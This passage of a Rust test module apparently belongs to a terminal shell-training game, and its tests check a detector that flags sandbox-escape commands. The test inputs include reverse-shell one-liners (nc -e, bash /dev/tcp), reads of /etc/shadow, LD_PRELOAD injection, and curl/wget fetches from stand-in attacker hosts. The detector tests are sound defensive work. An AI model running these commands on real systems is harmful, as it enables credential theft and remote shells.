            escape_attempt_reason("cat /etc/shadow"),
            Some("host shadow file probe")
        );
        assert_eq!(
            escape_attempt_reason("cat /etc/sudoers"),
            Some("host privilege escalation probe")
        );
        assert_eq!(
            escape_attempt_reason("LD_PRELOAD=/tmp/evil.so ls"),
            Some("dynamic linker injection probe")
        );
        assert_eq!(
            escape_attempt_reason("nmap -sV 10.0.0.1"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("masscan --rate 1000 10.0.0.0/24"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("rsh target-host"),
            Some("network pivot attempt")
        );
        assert_eq!(
            escape_attempt_reason("sudo su -"),
            Some("privilege escalation attempt")
        );
        assert_eq!(
            escape_attempt_reason("docker run --privileged alpine"),
            Some("container breakout tooling probe")
        );

        // New pattern coverage
        assert_eq!(
            escape_attempt_reason("mkfifo /tmp/f; nc -e /bin/bash host 4444"),
            Some("named pipe reverse shell probe")
        );
        assert_eq!(
            escape_attempt_reason("echo dGVzdA== | base64 -d | bash"),
            Some("encoded payload execution probe")
        );
        assert_eq!(
            escape_attempt_reason("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some("bash tcp redirect probe")
        );
        assert_eq!(
            escape_attempt_reason("curl https://evil.example.com/shell.sh"),
            Some("external host/network call attempt")
        );
        assert_eq!(
            escape_attempt_reason("wget http://attacker.example.org/payload"),
            Some("external host/network call attempt")
        );
        assert_eq!(escape_attempt_reason("ls /logs"), None);
        assert_eq!(escape_attempt_reason("cat /data/inventory.tsv"), None);
    }

    #[test]
    fn prompt_user_is_sanitized() {
        assert_eq!(sanitize_prompt_user("snake8503"), "snake8503");
        assert_eq!(sanitize_prompt_user("neo@203.0.113.10"), "neo");
        assert_eq!(sanitize_prompt_user("\x1b[31mroot"), "root");
        assert_eq!(sanitize_prompt_user(""), "guest");
    }

    #[test]
    fn line_endings_are_normalized_for_cross_terminal_clients() {
        assert_eq!(normalize_line_endings("a\nb"), "a\r\nb");
        assert_eq!(normalize_line_endings("a\r\nb\n"), "a\r\nb\r\n");
    }

    #[test]
    fn terminal_capability_detection_is_reasonable() {
        assert!(terminal_supports_ansi("xterm-256color"));
        assert!(!terminal_supports_ansi("dumb"));
        assert!(terminal_supports_unicode("xterm-256color"));
        assert!(!terminal_supports_unicode("vt100"));
        assert!(locale_supports_unicode("en_US.UTF-8"));
        assert!(!locale_supports_unicode("C"));
    }

    #[test]
    fn guide_is_registered_as_game_command() {
        assert!(is_game_command("guide"));
        assert!(is_game_command("briefing"));
    }

    #[test]
    fn mission_track_labels_are_human_readable() {
        assert_eq!(mission_track_label("keys-vault", true, false), "required");
        assert_eq!(mission_track_label("pipes-101", false, true), "starter");
        assert_eq!(mission_track_label("awk-patrol", false, false), "advanced");
        assert_eq!(mission_track_label("nav-101", false, false), "tutorial");
        assert_eq!(mission_track_label("head-tail", false, false), "intermed");
        assert_eq!(mission_track_label("deep-pipeline", false, false), "expert");
        assert_eq!(mission_track_label("decrypt-wren", false, false), "expert");
    }
}
